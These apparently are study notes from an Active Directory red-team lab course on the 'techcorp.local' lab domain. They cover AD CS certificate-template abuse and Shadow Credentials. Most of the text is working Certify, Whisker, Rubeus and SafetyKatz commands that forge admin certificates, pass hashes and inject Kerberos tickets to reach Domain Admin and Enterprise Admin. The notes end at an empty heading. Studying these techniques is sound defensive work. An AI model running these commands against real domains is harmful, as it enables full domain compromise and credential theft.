
• Active Directory Certificate Services (AD CS) enables use of Public Key
Infrastructure (PKI) in active directory forest.
• AD CS helps in authenticating users and machines, encrypting and
signing documents, filesystem, emails and more.
• "AD CS is the Server Role that allows you to build a public key
infrastructure (PKI) and provide public key cryptography, digital
certificates, and digital signature capabilities for your organization."

###### Terminology

• CA - The certification authority that issues certificates. The server with AD CS
role (DC or separate) is the CA.
• Certificate - Issued to a user or machine and can be used for authentication,
encryption, signing etc.
• CSR - Certificate Signing Request made by a client to the CA to request a
certificate.
• Certificate Template - Defines settings for a certificate. Contains information
like - enrolment permissions, EKUs, expiry etc.
• EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a
certificate template (Client authentication, Smart Card Logon, SubCA etc.)


###### Abuse

![[Pasted image 20250211215254.png]]


![[Pasted image 20250211215322.png]]

#### AD CS Enumeration

We can use the Certify tool (https://github.com/GhostPack/Certify) to
enumerate (and for other attacks) AD CS in the target forest:

```
Certify.exe cas
```

Enumerate the templates.:

```
Certify.exe find
```

Enumerate vulnerable templates:

```
Certify.exe find /vulnerable
```


#### Priv Esc - Across domain trusts – AD CS


  Common requirements/misconfigurations for all the Escalations
	– CA grants normal/low-privileged users enrollment rights
	– Manager approval is disabled
	– Authorization signatures are not required
	– The target template grants normal/low-privileged users enrollment
	   rights



Note that this does not show up when we enumerate vulnerable
templates in Certify. Use:

```
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
```

We have the certificate of pawadmin that we extracted from us-jump.

Use the certificate to request a TGT for pawadmin and inject it:

```
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin
/certificate:C:\AD\Tools\pawadmin.pfx
/password:SecretPass@123 /nowrap /ptt
```

Request a certificate for DA!

```
C:\AD\Tools\Certify.exe request /ca:Techcorp-
DC.techcorp.local\TECHCORP-DC-CA
/template:ForAdminsofPrivilegedAccessWorkstations
/altname:Administrator
```

Convert from cert.pem to pfx:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -
keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export
-out C:\AD\Tools\DA.pfx
```

Request DA TGT and inject it:

```
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator
/certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap
/ptt
```

Request a certificate for EA!

```
C:\AD\Tools\Certify.exe request /ca:Techcorp-
DC.techcorp.local\TECHCORP-DC-CA
/template:ForAdminsofPrivilegedAccessWorkstations
/altname:Administrator
```

Convert from cert.pem to pfx:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -
keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export
-out C:\AD\Tools\EA.pfx
```

Request EA TGT and inject it:

```
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator
/dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx
/password:SecretPass@123 /nowrap /ptt
```


#### Shadow Credentials

• Users and Computers have msDS-KeyCredentialLink attribute that
contains the raw public keys of certificate that can be used as an
alternate credential.

• This attribute is used when we configure Windows Hello for Business
(WHfB)

• By default, Key Admins and Enterprise Key Admins have rights to modify
the msDS-KeyCredentialLink attribute.

• User to User (U2U) Service Ticket can be requested to decrypt the
encrypted NTLM_SUPPLEMENTAL_CREDENTIAL entity from Privilege
Attribute Certificate (PAC) and extract NTLM hash.

• Pre-requisites to abuse Shadow Credentials:
- AD CS (Key Trust if AD CS is not present)
- Support for PKINIT and at least one DC with Windows Server 2016 or
above.

- Permissions (GenericWrite/GenericAll) to modify the msDS-
KeyCredentialLink attribute of the target object.


##### Abusing User Object

Enumerate the permissions.

```
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match "StudentUsers"}
```

Add the Shadow Credential.

```
Whisker.exe add /target:supportXuser
```

Using PowerView, see if the Shadow Credential is added.

```
Get-DomainUser -Identity supportXuser
```

Request the TGT by leveraging the certificate.

```
Rubeus.exe asktgt /user:supportXuser
/certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW....
/password:"1OT0qAom3..." /domain:us.techcorp.local
/dc:US-DC.us.techcorp.local /getcredentials /show
/nowrap
```

Inject the TGT in the current session or use the NTLM hash

```
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

#### Abusing Computer Object

Enumerate the permissions.

```
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match 'mgmtadmin’}
```

Add the Shadow Credentials.

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin
/domain:us.techcorp.local
/aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b4
19db24c00f /run:cmd.exe" "exit"
```

```
Whisker.exe add /target:us-helpdesk$
```


Using PowerView, see if the Shadow Credential is added.

```
Get-DomainComputer -Identity us-helpdesk
```

Request the TGT by leveraging the certificate.

```
Rubeus.exe asktgt /user:us-helpdesk$
/certificate:MIIJ0AIBAzCCCYwGCSqGSIb...
/password:"ViGFoZJa..." /domain:us.techcorp.local
/dc:US-DC.us.techcorp.local /getcredentials /show
```

Request and Inject the TGS by impersonating the user.

```
Rubeus.exe s4u /dc:us-dc.us.techcorp.local
/ticket:doIGkDCCBoygAwIBBaEDAgEW...
/impersonateuser:administrator /ptt /self
/altservice:cifs/us-helpdesk
```


#### Attacking Azure AD Integration




